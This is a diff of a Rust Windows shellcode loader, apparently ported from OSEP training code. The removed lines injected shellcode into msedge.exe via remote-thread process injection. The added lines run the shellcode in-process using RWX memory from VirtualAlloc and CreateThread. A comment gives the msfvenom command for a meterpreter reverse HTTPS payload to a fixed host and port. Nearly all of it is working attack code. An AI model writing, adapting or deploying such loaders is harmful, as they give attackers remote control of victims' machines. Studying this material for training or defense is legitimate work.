@@ -1,21 +1,14 @@
-extern crate kernel32;
+// this is a Rust port from the C# OSEP code
+
+use winapi::um::memoryapi::VirtualAlloc;
+use winapi::um::processthreadsapi::CreateThread;
+use winapi::um::synchapi::WaitForSingleObject;
 
 use std::ptr;
-use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS};
-use std::convert::TryFrom;
-use sysinfo::{ProcessExt, System, SystemExt};
+use std::ptr::null_mut;
 
-
-fn process_hunter() -> u32 {
-    // search for msedge.exe PID. If multiple msedge.exe instances are running, it returns the first one it gets.
-    let s = System::new_all();
-    let target = s.get_process_by_name("msedge.exe")[0];
-    let target_pid: u32 = u32::try_from(target.pid()).unwrap();
-
-    return target_pid;
-}
-
-fn main() {
+//dead simple loader, with plain text shellcode
+pub extern "C" fn main() {
 
     // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.56.101 LPORT=443 EXITFUNC=thread -f csharp
     let shellcode: [u8; 676] = [
@@ -67,33 +60,10 @@ fn main() {
         0xd5,
     ];
 
-    let target_pid: u32 = process_hunter();
-    println!("Targeting {}", target_pid);
-
     unsafe {
-        let h = kernel32::OpenProcess(
-            PROCESS_ALL_ACCESS,
-            winapi::shared::ntdef::FALSE.into(),
-            target_pid,
-        );
-        let addr = kernel32::VirtualAllocEx(
-            h,
-            ptr::null_mut(),
-            shellcode.len() as u64,
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_EXECUTE_READWRITE,
-        );
-        let mut n = 0;
-        kernel32::WriteProcessMemory(h, addr, shellcode.as_ptr() as _, shellcode.len() as u64, &mut n);
-        let _h_thread = kernel32::CreateRemoteThread(
-            h,
-            ptr::null_mut(),
-            0,
-            Some(std::mem::transmute(addr)),
-            ptr::null_mut(),
-            0,
-            ptr::null_mut(),
-        );
-        kernel32::CloseHandle(h);
+        let alloc = VirtualAlloc(null_mut(), 0x100, 0x3000, 0x40) as *mut u8;
+        alloc.copy_from(shellcode.as_ptr() as *mut u8, shellcode.len());
+        let h_thread = CreateThread(ptr::null_mut(),0,Some(std::mem::transmute(alloc)), ptr::null_mut(), 0,ptr::null_mut());
+        let _result = WaitForSingleObject(h_thread, 0xFFFFFFFF);
     }
 }
